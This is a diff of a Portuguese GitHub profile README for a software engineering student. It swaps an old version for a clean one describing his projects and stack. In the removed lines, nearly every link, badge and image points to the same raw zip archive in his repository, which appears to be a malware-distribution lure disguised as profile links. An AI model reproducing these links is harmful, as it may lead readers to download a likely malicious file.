@@ -1,76 +1,139 @@
+# 👨‍💻 PAULO MIGUEL
 
-# 👨‍💻 PAULO MIGUEL DEV
+### Desenvolvedor Full-Stack em formação | React • JavaScript • TypeScript • Next.js
 
-<!-- **`Digital Craftsman (Developer/Filmmaker/Creator)`** -->
+Olá! Eu sou o Paulo Miguel 👋
 
-Olá! Eu sou o Paulo Miguel 👋 <br/>
-🎓 Estou no 4º período da faculdade de Engenharia de Software <br/>
-🚀 Atualmente me aprofundando em https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip <br/>
-📚 Também estudando React <br/>
-📌 Buscando uma oportunidade para atuar como Desenvolvedor Front-end <br/>
-📺 Tenho um canal no youtube que faço lives diárias 👇
+🎓 Estudante do **7º período de Engenharia de Software**
+💻 Desenvolvedor em formação com foco em **desenvolvimento Front-end**
+🚀 Construindo projetos próprios para transformar conhecimento em experiência prática
+📚 Atualmente aprofundando meus conhecimentos em **React, TypeScript, Next.js e Node.js**
+🎯 Buscando minha primeira oportunidade como **Desenvolvedor Full-Stack / Estagiário**
 
-   <p align="left">
-      <a href="https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip">
-         <img alt="youtube subscribers" title="Subscribe to my YouTube channel" src="https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip%23E05D44&label=SUBSCRIBE&logo=video&logoColor=white&style=for-the-badge&labelColor=CE4630"/></a> 
-      <a href="https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip">
-         <img alt="youtube views" title="YouTube views" src="https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip%23E1AD0E&logo=eye&logoColor=white&style=for-the-badge&labelColor=C79600"/></a> 
-      <a href="https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip">
-         <img alt="followers" title="Follow me on Github" src="https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip"/></a>
-      <a href="https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip">
-         <img alt="total stars" title="Total stars on GitHub" src="https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip"/></a>
-   </p>
+Também compartilho minha jornada de desenvolvimento através de lives de programação no YouTube.
 
 ---
 
-### 🧰 Linguagens e Ferramentas
+## 🧰 Tecnologias e Ferramentas
 
+### Front-end
 
-<img align="left" alt="React" width="30px" style="padding-right:10px;" src="https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip" />
-<img align="left" alt="NodeJS" width="30px" style="padding-right:10px;" src="https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip" />
-<img align="left" alt="HTML" width="30px" style="padding-right:10px;" src="https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip" />
-<img align="left" alt="CSS" width="30px" style="padding-right:10px;" src="https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip" />
-<img align="left" alt="JavaScript" width="30px" style="padding-right:10px;" src="https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip" />
-<img align="left" alt="TypeScript" width="30px" style="padding-right:10px;" src="https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip" />
-<img align="left" alt="Git" width="30px" style="padding-right:10px;" src="https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip" />
+<img align="left" alt="HTML" width="30px" style="padding-right:10px;" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/html5/html5-original.svg" />
+<img align="left" alt="CSS" width="30px" style="padding-right:10px;" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/css3/css3-original.svg" />
+<img align="left" alt="JavaScript" width="30px" style="padding-right:10px;" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/javascript/javascript-original.svg" />
+<img align="left" alt="TypeScript" width="30px" style="padding-right:10px;" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/typescript/typescript-original.svg" />
+<img align="left" alt="React" width="30px" style="padding-right:10px;" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/react/react-original.svg" />
+<img align="left" alt="Next.js" width="30px" style="padding-right:10px;" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/nextjs/nextjs-original.svg" />
+<img align="left" alt="Tailwind CSS" width="30px" style="padding-right:10px;" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/tailwindcss/tailwindcss-original.svg" />
 
 <br />
+<br />
 
-#
+### Back-end, Banco de Dados e Ferramentas
 
-<!-- ### 📺 Latest YouTube Videos -->
+<img align="left" alt="Node.js" width="30px" style="padding-right:10px;" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/nodejs/nodejs-original.svg" />
+<img align="left" alt="Express" width="30px" style="padding-right:10px;" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/express/express-original.svg" />
+<img align="left" alt="MongoDB" width="30px" style="padding-right:10px;" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/mongodb/mongodb-original.svg" />
+<img align="left" alt="PostgreSQL" width="30px" style="padding-right:10px;" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/postgresql/postgresql-original.svg" />
+<img align="left" alt="Git" width="30px" style="padding-right:10px;" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/git/git-original.svg" />
+<img align="left" alt="GitHub" width="30px" style="padding-right:10px;" src="https://cdn.jsdelivr.net/gh/devicons/devicon/icons/github/github-original.svg" />
 
-<!-- BEGIN YOUTUBE-CARDS -->
-<!-- [![I Tried Coding on Every OS // Here’s What I Learned](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip+Tried+Coding+on+Every+OS+%2F%2F+Here%E2%80%99s+What+I+Learned&lang=en&timestamp=1763053302&background_color=%230d1117&title_color=%23ffffff&stats_color=%23dedede&max_title_lines=1&width=250&border_radius=5&duration=1455 "I Tried Coding on Every OS // Here’s What I Learned")](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip)
-[![Java Isn't Verbose // we just suck](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip+Isn%27t+Verbose+%2F%2F+we+just+suck&lang=en&timestamp=1761941401&background_color=%230d1117&title_color=%23ffffff&stats_color=%23dedede&max_title_lines=1&width=250&border_radius=5&duration=1275 "Java Isn't Verbose // we just suck")](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip)
-[![Everything You Need to Know About Coding with AI // NOT vibe coding](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip+You+Need+to+Know+About+Coding+with+AI+%2F%2F+NOT+vibe+coding&lang=en&timestamp=1760552100&background_color=%230d1117&title_color=%23ffffff&stats_color=%23dedede&max_title_lines=1&width=250&border_radius=5&duration=795 "Everything You Need to Know About Coding with AI // NOT vibe coding")](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip)
-[![AI is writing 90% of your code?](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip+is+writing+90%25+of+your+code%3F&lang=en&timestamp=1758908426&background_color=%230d1117&title_color=%23ffffff&stats_color=%23dedede&max_title_lines=1&width=250&border_radius=5&duration=19 "AI is writing 90% of your code?")](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip)
-[![Java just got cleaner](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip+just+got+cleaner&lang=en&timestamp=1758046504&background_color=%230d1117&title_color=%23ffffff&stats_color=%23dedede&max_title_lines=1&width=250&border_radius=5&duration=449 "Java just got cleaner")](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip)
-[![Java is 30 Years Old // Here’s Why It’s Still Winning](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip+is+30+Years+Old+%2F%2F+Here%E2%80%99s+Why+It%E2%80%99s+Still+Winning&lang=en&timestamp=1757602898&background_color=%230d1117&title_color=%23ffffff&stats_color=%23dedede&max_title_lines=1&width=250&border_radius=5&duration=574 "Java is 30 Years Old // Here’s Why It’s Still Winning")](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip) -->
-<!-- END YOUTUBE-CARDS -->
-
-[<img src="https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip inscreva%20para%20mais-red?style=for-the-badge&logo=video&logoColor=white"/>](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip)
-
-#
-
-### 📊 Stats
-
-![Forrest's GitHub stats](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip)
-
-<!-- ![GitHub Streak](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip) -->
-
-#
-<!--
-<details>
- <summary><h3>👨‍💻 Forrest's Coding Journey</h3></summary>
-   I started my coding journey as a naive computer science student with a passion to learn everything I could about this programming world - code, unix, linux, theory. And all the while, teaching myself iOS development with a dream to build my own app, but that soon got overshadowed by my desire to excel in Java. A desire that landed me a full-stack software engineering job upon graduation. However, I had another desire I had been pursuing throughout this time - YouTube content creation. I eventually ended up quitting my software engineering job to pursue YouTube full-time, and that has been my focus ever since. But there's something that's always bothered me about my journey - abandoning my dream of building my own app to pursue the safe route, a job. Now I've already taken the leap away from that safety net into this uncomfortable, unexplored world that it being a creator. And it worked out, but again, it became comfortable. It's easier to create a video than go out on a ledge and build my own product. I do have to eat, at the end of the day, but I think it's time. It's time to get uncomfortable again. I have a burning desire to get back on the horse, and fulfill that dream younger me had of building my own app, my own product. And in order to do that, I'll be implmementing a few measures to streamline my YouTube content to focus more time on fulfilling that dream - a dream that I'll be ready to tackle in 2023 due to the measure I'm putting in place now until the end of 2022. Don't wait up, because I'm coming.
--->
-<!-- [website]: https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip
-[youtube]: https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip -->
-### 🔝 Principais Contribuições
-
-![](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip)
+<br />
+<br />
 
 ---
 
-[![](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip)](https://github.com/PauloMiguelVIdal/PauloMiguelVIdal/raw/refs/heads/main/sirdarship/V-Miguel-Idal-Paulo-v3.8-beta.1.zip)
+# 🚀 Principais Projetos
+
+## 💈 Brave Boss — Sistema de Agendamento para Barbearia
+
+Aplicação web de agendamento desenvolvida para uma **barbearia real**, com foco em gerenciamento de horários, serviços e clientes.
+
+O projeto envolve autenticação, regras de negócio, gerenciamento de dados e integração com banco de dados, além de uma interface responsiva voltada para a experiência do usuário.
+
+**Principais conceitos aplicados:**
+
+* 📅 Agendamento e gerenciamento de horários
+* 👤 Cadastro e gerenciamento de clientes
+* 💈 Gerenciamento de serviços
+* 🔐 Autenticação
+* 🗄️ Banco de dados
+* ⚙️ Regras de negócio
+* 📱 Interface responsiva
+
+**Stack:** Next.js • TypeScript • Supabase • PostgreSQL • Tailwind CSS • Vercel
+
+---
+
+## 🎮 Business Game — Simulação Econômica e Estratégia
+
+Projeto autoral de **jogo de estratégia e simulação econômica**, no qual o jogador assume o papel de CEO e administra uma corporação ao longo de 360 dias.
+
+O projeto possui diversos sistemas interconectados, como economia dinâmica, missões, cartas, Draft, inventário, sinergias entre construções e análise financeira.
+
+**Principais sistemas:**
+
+* 📈 Economia dinâmica e estados de mercado
+* 🎯 Sistema de missões — DNA da Empresa
+* 🃏 Sistema de cartas e Draft
+* 📦 Gerenciamento de inventário
+* ⚡ Sistema de Sinergias / PowerUps
+* 💰 Gestão financeira e indicadores
+* 📊 Análise de ROI, lucro e patrimônio
+* 🗺️ Mapa dinâmico da corporação
+* 🏢 Sistema de setores e construções
+
+O principal desafio foi integrar diferentes sistemas de regras de negócio e gerenciamento de estado em uma única aplicação, mantendo a interface organizada e compreensível.
+
+**Stack:** React • JavaScript • Tailwind CSS • Context API • Framer Motion • Chart.js • Git • GitHub
+
+---
+
+## 🛍️ Rochelli Store — E-commerce de Vestuário
+
+Aplicação web de **e-commerce de vestuário**, desenvolvida como projeto Full Stack utilizando a stack MERN.
+
+O projeto simula o funcionamento de uma loja virtual, permitindo gerenciamento de produtos, visualização do catálogo, autenticação de usuários e fluxo de pedidos.
+
+**Principais funcionalidades:**
+
+* 👕 Cadastro e gerenciamento de produtos
+* 📏 Controle de tamanhos
+* 🛒 Catálogo de produtos
+* 🔐 Autenticação de usuários
+* 🔑 Proteção de senhas com bcrypt
+* 📦 Simulação do fluxo de pedidos
+* 🔗 Integração entre frontend e backend
+* 🗄️ Persistência em banco de dados
+* ⚙️ API e regras de negócio
+* 🏗️ Estrutura baseada em MVC
+
+**Stack:** React • JavaScript • Node.js • Express • MongoDB • MVC • Git • GitHub
+
+---
+
+# 📺 Jornada de Desenvolvimento
+
+Além de desenvolver projetos, compartilho minha evolução como desenvolvedor através de **lives de programação**, mostrando estudos, desenvolvimento de projetos e resolução de problemas na prática.
+
+### 🎥 Do Zero ao Estágio
+
+[![YouTube](https://img.shields.io/badge/YouTube-Do%20Zero%20ao%20Estágio-red?style=for-the-badge\&logo=youtube\&logoColor=white)](https://www.youtube.com/@PauloMiguel)
+
+---
+
+# 📊 GitHub Stats
+
+![Paulo Miguel's GitHub stats](https://github-readme-stats.vercel.app/api?username=PauloMiguelVIdal\&show_icons=true\&theme=tokyonight)
+
+![Top Langs](https://github-readme-stats.vercel.app/api/top-langs/?username=PauloMiguelVIdal\&layout=compact\&theme=tokyonight)
+
+---
+
+## 🔗 Onde me encontrar
+
+[![GitHub](https://img.shields.io/badge/GitHub-PauloMiguelVIdal-181717?style=for-the-badge\&logo=github)](https://github.com/PauloMiguelVIdal)
+
+[![LinkedIn](https://img.shields.io/badge/LinkedIn-Paulo%20Miguel-0A66C2?style=for-the-badge\&logo=linkedin\&logoColor=white)](https://www.linkedin.com/in/paulo-miguel-vidal-da-silva/)
+
+[![YouTube](https://img.shields.io/badge/YouTube-Paulo%20Miguel-FF0000?style=for-the-badge\&logo=youtube\&logoColor=white)](https://www.youtube.com/@PauloMiguel)
